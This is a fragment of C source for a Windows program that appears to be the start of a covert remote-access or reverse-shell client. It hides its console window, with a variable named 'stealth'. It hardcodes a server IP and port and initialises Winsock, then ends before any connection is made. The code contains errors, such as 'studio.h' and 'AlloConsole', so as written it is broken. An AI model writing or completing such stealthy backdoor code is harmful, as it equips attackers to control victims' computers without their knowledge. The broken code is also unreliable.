#include <studio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

  HWND stealth;
  AlloConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);

  ShowWindow(stealth, 0);

  struct sockaddr_in SerAddr;
  unsigned short ServPort;
  char *ServIP;
  WSADATA wsaData;

  ServIP = "192.168.1.224";
  ServPort = 3141;

  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }
}
